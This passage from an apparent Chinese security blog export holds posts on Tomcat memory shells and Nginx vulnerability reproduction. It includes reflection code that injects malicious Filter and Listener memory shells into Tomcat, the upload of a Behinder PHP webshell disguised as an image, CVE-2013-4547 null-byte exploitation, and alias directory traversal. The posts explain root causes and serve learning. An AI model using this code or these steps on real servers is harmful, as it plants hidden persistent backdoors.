filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">// 这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filtermap 添加到 filterMaps 中的第一个位置</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 利用反射创建 FilterConfig，并且将 filterDef 和 standardCtx（即 Context）作为参数进行传入</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将 name 和 filterConfig 作为 key-value进行传入</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Windows下测试结果：</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209110036049.png" alt="image-20211209110036049"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209110230572.png" alt="image-20211209110230572"></p>
<h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>该Filter内存马在服务器重启后会失效(StandardContext在tomcat的生命周期内保存)，且该方法仍需要上传jsp文件才能使用该内存马 - 我们其实可以通过反序列化来实现动态注册filter，在之后的篇章将会涉及。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na">https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na</a></p>
<p><a href="https://blog.csdn.net/lqzkcx3/article/details/79357144">https://blog.csdn.net/lqzkcx3/article/details/79357144</a></p>
<p><a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Memory Shell</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Memory Shell</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx漏洞复现系列</title>
    <url>/2021/07/20/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在漏洞复现的过程中，我并不想单纯地复现漏洞，而是想要找出漏洞成因和原理，不想当一个脚本小子。</p>
<p>我在了解这些漏洞的过程中，发现国内的很多文章中漏洞原理和成因都解释得不清不楚，想要完全搞清楚一个漏洞的成因十分困难，有时甚至花上一天去研究一个漏洞的成因，于是我决定将我所理解的知识点详细记录下来。</p>
<h1 id="Nginx介绍"><a href="#Nginx介绍" class="headerlink" title="Nginx介绍"></a>Nginx介绍</h1><blockquote>
<p>Nginx(engine X)是一款轻量级的Web服务器、反向代理服务器，由于它的内存占用少，启动极快，高并发能力强，在互联网项目中广泛应用。</p>
</blockquote>
<p>简单来说，<strong>代理</strong>就像一个中介。</p>
<p>我们借助VPN来访问一些网站，而VPN就是一个<strong>正向代理</strong>的例子。我们向VPN发送请求，VPN再把我们的请求发送给目标服务器，而<strong>目标服务器并不知道我们真实的IP地址</strong>，只知道与他交互的人（正向代理服务器）。所以可知<strong>正向代理是代理客户端（我们）的</strong>。</p>
<p>而<strong>反向代理</strong>中，代理是<strong>代理服务端</strong>的。我们客户端不需要进行任何配置，即可发送请求给对方网站，发送的请求会通过<strong>反代理服务器</strong>，然后反代理服务器再把请求传给最终的目标服务器，最后返回给客户端，而<strong>我们是不知道真实的目标服务器IP地址的</strong>。所以可知，<strong>反向代理代理目标服务器</strong>。</p>
<span id="more"></span>

<h1 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>该漏洞与<code>nginx</code>、<code>php</code>版本无关，是用户配置不当造成的漏洞。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="什么是CGI"><a href="#什么是CGI" class="headerlink" title="什么是CGI"></a>什么是CGI</h3><blockquote>
<p>CGI是外部应用程序与WEB服务器之间的接口标准。CGI规范允许Web服务器执行外部程序，并将它们的输出发送给Web浏览器，CGI将Web的一组简单的静态超媒体文档变成一个完整的新的交互式媒体。</p>
</blockquote>
<p>那么我们就把他理解成是WEB服务器与程序之间的一种接口就好了。</p>
<h3 id="Fastcgi、Nginx和PHP解析器的关系"><a href="#Fastcgi、Nginx和PHP解析器的关系" class="headerlink" title="Fastcgi、Nginx和PHP解析器的关系"></a>Fastcgi、Nginx和PHP解析器的关系</h3><p>首先，<code>fastcgi</code>是一种协议，全称 快速通用网关接口<code>（FastCommonGatewayInterface）</code>，是升级版的CGI。</p>
<p>这里我们只需要了解他们的运作流程。</p>
<p>如果<code>web server（nginx）</code>收到请求<code>/index.php</code>后，会开始查找文件，知道这不是一个静态文件后，需要找<code>PHP</code>解析器来处理，而在交给<code>PHP</code>解析器处理之前，需要<code>fastcgi</code>来规定传什么数据或什么格式给<code>PHP</code>解析器，之后PHP解析器会解析<code>php.ini</code>，处理请求，处理后把结果返回给浏览器。</p>
<h3 id="PATH-INFO和SCRIPT-FILENAME"><a href="#PATH-INFO和SCRIPT-FILENAME" class="headerlink" title="PATH_INFO和SCRIPT_FILENAME"></a>PATH_INFO和SCRIPT_FILENAME</h3><p>我们刚刚说到了<code>fastcgi</code>、<code>Nginx</code>和<code>PHP</code>解析器的关系，那么现在来说下漏洞涉及到的配置。</p>
<p><strong>什么是PATH_INFO？</strong></p>
<p>举一个例子，当你访问网址<code>/hello.php/id/123</code>的时候，<code>/id/123</code>便是你的<code>PATH_INFO</code></p>
<p><strong>什么是SCRIPT_FILENAME</strong></p>
<p>在<code>fastcgi</code>中的一个参数。当你访问网址<code>/hello.php/id/123</code>的时候，<code>/hello.php</code>便是你的<code>SCRIPT_FILENAME</code>，即执行脚本的绝对路径。</p>
<blockquote>
<p>转换成 PHP 中的变量就是 <code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code> ，PHP 参考手册中对 <code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code> 参数说明为当前执行脚本的绝对路径。</p>
</blockquote>
<p><strong>漏洞成因</strong></p>
<p>在<code>nginx/default.conf</code>的配置文件中<code>.php</code>后缀名的路径会交由<code>fastcgi</code>协议的<code>php</code>解析器处理。</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722142211210.png" alt="image-20210722142211210"></p>
<p>当我们访问<code>/shell.png/aaa.php</code>时，<strong>nginx</strong>不会对<code>aaa.php</code>是否存在进行检查，而是直接将路径提交给<code>fastcgi</code>，并将<code>fastcgi</code>的<code>SCRIPT_FILENAME</code>设为<code>/shell.png/aaa.php</code>（上面有讲过该参数怎么得来的）</p>
<p>接着<code>fastcgi</code>将这个参数<code>SCRIPT_FILENAME</code>传给<code>php</code>解析器<code>(php-fpm)</code></p>
<p>这时候，<code>PHP</code>解析器收到了这个<code>SCRIPT_FILENAME</code>，但它发现<code>aaa.php</code>并不存在，怎么办呢？</p>
<p>因为我们配置了<code>cgi.fix_pathinfo=1</code>，所以<code>php</code>会修正传过来的这个<code>SCRIPT_FILENAME</code>，认为<strong>脚本执行的绝对路径</strong>不应该是<code>/shell.png/aaa.php</code>而是存在的文件<code>/shell.png</code>（他会根据提供的路径一直往上级目录找，直到找到存在的文件，但寻找到后他也不会判断找到的文件的后缀格式），同时<code>PATH_INFO</code>应该是<code>/aaa.php</code></p>
<p>所以我们所提交的<code>/shell.png/aaa.php</code>请求，会被错误解析，从而引发安全漏洞 -&gt; <code>PHP</code>解析器会去解析非<code>PHP</code>格式的<code>shell.png</code>，而把<code>/aaa.php</code>当作<code>PATH_INFO</code></p>
<p>换句话说，<code>PHP</code>解析器认为该执行的脚本是<code>shell.png</code>，而后面的路径只是<code>PATH_INFO</code>而已。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>准备一个冰蝎的PHP马，后缀改为<code>jpg</code>格式，然后直接上传，发现提示<img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722150828954.png" alt="image-20210722150828954"></p>
<p>猜测是因为要检测文件头（具体没有研究），于是我重新上传一张正常的<code>png</code>图，用<code>burp suite</code>抓包修改</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722151008554.png" alt="image-20210722151008554"></p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722151106496.png" alt="image-20210722151106496"></p>
<p>发送后得到地址<img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722151134510.png" alt="image-20210722151134510"></p>
<p>访问：<img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722151207147.png" alt="image-20210722151207147"></p>
<p>已被解析为<code>php</code>文件，上冰蝎，成功：</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722151257093.png" alt="image-20210722151257093"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://serverfault.com/questions/627903/is-the-php-option-cgi-fix-pathinfo-really-dangerous-with-nginx-php-fpm">Is the PHP option cgi-fix-pathinfo really dangerous with Nginx+PHP-FPM</a></p>
<p><a href="https://www.laruence.com/2009/11/13/1138.html">Nginx(PHP/fastcgi)的PATH_INFO问题</a></p>
<p><a href="https://www.laruence.com/2010/05/20/1495.html">Nginx + PHP CGI的一个可能的安全漏洞</a></p>
<p><a href="https://www.vvave.net/archives/in-depth-understand-of-php-projects-about-pathinfo-usage.html">深入理解 PHP 项目关于 PATHINFO 使用问题</a></p>
<h1 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h1><h2 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
<p>错误地解析了用户请求，检测URI时的逻辑错误导致用户可以绕过对截断符<code>%00</code>的检测，从而形成漏洞。</p>
<h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722230026675.png" alt="image-20210722230026675"></p>
<p>从Nginx的配置文件中，我们可以看到，<code>php</code>后缀的文件被交给了<code>fastcgi</code>处理。<a name="Fastcgi、Nginx和PHP解析器的关系">fastcgi、Nginx和PHP解析器的关系</a> 在之前的解析漏洞有提到。</p>
<p>假设我们尝试访问一个图片，访问的网址是<code>/test.png \0.php</code>, nginx收到访问请求，开始判断这个是什么文件。<code>nginx</code>会先检测<code>URI</code>，发现在检测<code>uri</code>的时候，<code>nginx</code>会做如下检测：开始一个字节一个字节的检测，检测到<code>\0</code>的时候会判断其为非法字符。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> sw_check_uri:      </span><br><span class="line">   ……</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>: </span><br><span class="line">           r-&amp;gt;complex_uri = <span class="number">1</span>;  <span class="comment">//此作为flag会判断使用ngx_http_parse_complex_uri方法，对路径修复</span></span><br><span class="line">           state = sw_uri; </span><br><span class="line">           <span class="keyword">break</span>;    </span><br><span class="line">   ……</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:   <span class="comment">//当遇到\0时，将会判断为非法字符</span></span><br><span class="line">           <span class="keyword">return</span> NGX_HTTP_PARSE_INVALID_REQUEST;</span><br></pre></td></tr></table></figure>

<p>但代码中还有一层逻辑，就是当检测到有空格的时候，会执行到另一部分代码 <code>sw_check_uri_http_09</code>中：这时候的<code>ch</code>变成了我们的截断符<code>%00</code>，这里没有满足它的<code>case</code>，所以他将执行最后一段<code>default</code>代码，即返回到<code>sw_check_uri</code>中，这样<code>\0</code>就并未检测到，也不会被判断为<strong>非法字符</strong>。</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722232400410.png" alt="image-20210722232400410"></p>
<p>此时<code>ch</code>又变成了下一个字符<code>.</code>，之后被判断为<code>PHP</code>文件，该请求被交给了<code>fastcgi</code>处理，<code>fastcgi</code>被<code>\0</code>截断字符截断，所以最终交给<code>PHP</code>解析器解析的地址是<code>/test.png[空格]</code>，因此<code>test[空格].png</code>将被解析为<code>PHP</code>类。</p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>为了让截断符号不被检测到，我们需要用空格绕过检测，而空格应该在截断符号之前。需要注意的是，在windows环境下，空格是会被自动去掉的，而Linux是不可以去掉的。而我们的目标环境是<code>Linux</code>，所以我们必须上传带有空格的图片，这样<code>PHP解析器</code>才能找到这个文件，如果是<code>Windows</code>，就不用带空格。</p>
<p>先用<code>burp suite</code>抓包修改上传一个含木马的图片<code>test.png[空格] </code>，</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210723000546878.png" alt="image-20210723000546878"></p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210723000742595.png" alt="image-20210723000742595">这里我以<code>phpinfo()</code>作为检测。</p>
<p>上传后得到地址</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722234129588.png" alt="image-20210722234129588"></p>
<p>访问文件<code>test.png1</code>, 再次用<code>burp suite</code>抓包修改。这里说下为什么要访问<code>png1</code> - 我尝试过，直接访问<code>test.png</code>的话，<code>burp suite</code>是抓不到包的。</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722234425902.png" alt="image-20210722234425902"></p>
<p>修改GET路径为<code>/uploadfiles/test.png[空格][空格].png</code>，然后选中第二个空格修改hex值为<strong>00</strong>（截断符的意思）</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722234823479.png" alt="image-20210722234823479"></p>
<p>修改完毕后再发送请求。</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210723000838302.png" alt="image-20210723000838302"></p>
<p>漏洞利用成功。</p>
<h2 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/cj_Allen/article/details/109473363">【漏洞复现】Nginx 文件名逻辑漏洞（CVE-2013-4547）</a></p>
<p><a href="http://www.91ri.org/9064.html">CVE-2013-4547 Nginx解析漏洞深入利用及分析</a></p>
<h1 id="Nginx-目录穿越漏洞"><a href="#Nginx-目录穿越漏洞" class="headerlink" title="Nginx 目录穿越漏洞"></a>Nginx 目录穿越漏洞</h1><h2 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>该漏洞是用户配置不当造成的。</p>
<h2 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在分析漏洞原理之前，这里我们先讲一下<code>nginx</code>配置文件中<code>alias</code>和<code>root</code>的定义</p>
<p><code>alias</code>是目录别名</p>
<p><code>root</code>是最上层目录</p>
<p><strong>root</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location /hello/ &#123;</span><br><span class="line">    root /var/www/image</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 若按照上述配置的话，访问/hello目录里面的文件时, nginx会自动去/var/www/image/hello去找</span></span><br></pre></td></tr></table></figure>

<p> <strong>alias</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location /hello/ &#123;</span><br><span class="line"> <span class="built_in">alias</span> /var/www/image/</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 若按照上述配置的话，访问/hello目录里面的文件时, nginx会自动去/var/www/image目录找文件</span></span><br></pre></td></tr></table></figure>

<p>这个漏洞我们主要针对<strong>alias</strong>来说。</p>
<p>打开靶场的配置文件，我们可以看到<code>location /files</code>后面没有以<code>/</code>结尾</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210725140009372.png" alt="image-20210725140009372"></p>
<p>这意味着我们可以跨越到其他目录。</p>
<p>当我们访问<code>/files..</code>的时候，<code>/files</code>会变为<code>/home/</code>,而我们访问的地址将是<code>/home/..</code>，实际便跨越了目录。</p>
<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210725140308072.png" alt="image-20210725140308072"></p>
<p>成功访问了上级目录</p>
<h2 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.cnblogs.com/leslie1943/p/13764482.html">Nginx: nginx配置文件中的 alias 和 root</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Vulnerability Exploitation</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat内存马系列(二):Listener型</title>
    <url>/2021/12/29/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%BA%8C-Listener%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Listener型内存马分析起来比Filter型的要简单很多，在监听到请求后自动触发。学习了<strong>JavaWeb</strong>后再来看这些其实都并不难。</p>
<p>此文展示了我在不借助网上的Listener内存马资料下完成Listener内存马构造的过程。</p>
<span id="more"></span>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>首先创建一个servlet项目。引入Tomcat中的<strong>servlet-api.jar、tomcat-api.jar及catalina.jar</strong></p>
<h1 id="内存马流程分析"><a href="#内存马流程分析" class="headerlink" title="内存马流程分析"></a>内存马流程分析</h1><h2 id="listener类型"><a href="#listener类型" class="headerlink" title="listener类型"></a>listener类型</h2><p>学过servlet的话应该知道，listener分为以下类型：</p>
<ul>
<li>ServletRequestListener - 对每次请求进行监听</li>
<li>ServletContextListener -只会在服务器启动或者关闭时触发</li>
<li>ServletSessionListener - 在创建、销毁session登情况触发。</li>
</ul>
<p>显而易见，我们选择使用ServletRequestListener类型的listener比较合适，因为其可以监听每次request的执行与销毁；</p>
<h2 id="探究listener的注册与执行"><a href="#探究listener的注册与执行" class="headerlink" title="探究listener的注册与执行"></a>探究listener的注册与执行</h2><p>接下来，我们随意创建一个<code>TestListener</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;evil code&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将他加入web.xml</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229151841950.png" alt="image-20211229151841950"></p>
<p>现在来探究一个正常的Listener被执行的流程</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152257919.png" alt="image-20211229152257919"></p>
<p>在Class被创建的地方下个断点，再在代码执行的地方下个断点。</p>
<p>发现了关键的地方 <code>listenerStart()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152439542.png" alt="image-20211229152439542"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229152524318.png" alt="image-20211229152524318"></p>
<p>继续跟进<code>findApplicationListeners()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] findApplicationListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.applicationListeners;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由此可见，如果我们修改了<code>StandardContext</code>的<code>applicationListeners</code>属性，就可以让我们自己构造的恶意Listener加载进去。</p>
<p>那么怎么能够获取到<code>StandardContext</code>呢？</p>
<p>这里可能要一些前置知识：<strong>每一个项目都有一个ServletContext, ServletContext是全局共享的，也就是说所有的Servlet都可以访问这一个ServletContext，而ServletContext中往往保存上下文内可以访问的其他servlet的属性</strong></p>
<p>那么<code>StandardContext</code>可能就在<code>ServletContext</code>中，而我们可以通过request来获取到ServletContext。</p>
<p>我们在自己创建的<strong>HomeServlet</strong>中获取ServletContext并下个断点，重新运行看看</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229153455331.png" alt="image-20211229153455331"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229153607771.png" alt="image-20211229153607771"></p>
<p>获取后发现，servletContext中有一个applicationContext，其中包含了StandardContext，我们可以通过这里获取。</p>
<h1 id="手动注册内存马"><a href="#手动注册内存马" class="headerlink" title="手动注册内存马"></a>手动注册内存马</h1><p>那么我们可以用反射的方式来获取到StandardContext</p>
<p>Tomcat在处理jsp页面的时候，实际上创建一个servlet，并把jsp中的代码翻译生成到该servlet中，因此我们下面的演示直接在自己创建的<code>HomeServlet.java</code>中执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">Field stdFiled=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">aplContext</span> <span class="operator">=</span> (ApplicationContext) stdFiled.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardFld</span> <span class="operator">=</span> aplContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardFld.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardFld.get(aplContext);</span><br></pre></td></tr></table></figure>

<p>接下来我们依然要用反射的方式获取到其<code>applicationListeners</code>属性，并将我们的恶意Listener放在最前面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());</span><br><span class="line">applicationEventListeners.add(<span class="number">0</span>,<span class="keyword">new</span> <span class="title class_">TestListener</span>());</span><br></pre></td></tr></table></figure>

<p>到这里报错了</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229154211578.png" alt="image-20211229154211578"></p>
<p>看起来是add方法出了问题。</p>
<blockquote>
<p>Array内部的ArrayList没有重写AbstractList的add（xxx），导致我们上诉代码调用的add（xxx）其实是直接调用AbstractList类的add（xxx），所以直接抛出了异常UnsupportedOperationException。</p>
</blockquote>
<p>那么直接换成ArrayList即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());</span><br><span class="line">List&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(applicationEventListeners);</span><br><span class="line">arrayList.add(<span class="number">0</span>,<span class="keyword">new</span> <span class="title class_">TestListener</span>());</span><br></pre></td></tr></table></figure>

<p>最后将新建的arrayList重新赋值给<code>applicationEventListeners</code>，恰好有个这样的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">standardContext.setApplicationEventListeners(arrayList.toArray());</span><br></pre></td></tr></table></figure>

<p><strong>整个注册内存马的过程：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">Field stdFiled=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">aplContext</span> <span class="operator">=</span> (ApplicationContext) stdFiled.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardFld</span> <span class="operator">=</span> aplContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardFld.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardFld.get(aplContext);</span><br><span class="line"></span><br><span class="line">List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());</span><br><span class="line">List&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(applicationEventListeners);</span><br><span class="line">arrayList.add(<span class="number">0</span>,<span class="keyword">new</span> <span class="title class_">TestListener</span>());</span><br><span class="line">standardContext.setApplicationEventListeners(arrayList.toArray());</span><br></pre></td></tr></table></figure>

<h1 id="构造恶意内存马"><a href="#构造恶意内存马" class="headerlink" title="构造恶意内存马"></a>构造恶意内存马</h1><p>构造内存马，直接把上面的注册过程写到jsp页面，然后在jsp页面写一个<code>&lt;%! 方法%&gt;</code>就可以了。</p>
<p>需要注意的是，重写的<code>ServletRequestListener</code>的类方法<code>public void requestInitialized(ServletRequestEvent servletRequestEvent)</code>中，只有参数<code>servletRequestEvent</code>，而没有response。 如果我们想使用内存马，最好是能够有回显。</p>
<p>在<strong>Request</strong>类中，我们可以得到response，而Request类是<strong>RequestFacade</strong>类中的属性<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229165853415.png" alt="image-20211229165853415"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229165807812.png" alt="image-20211229165807812"></p>
<p>只要能够得到RequestFacade中的request属性，就能得到response object，所以我们直接用反射的方法来完成。</p>
<p><strong>完整构造</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span 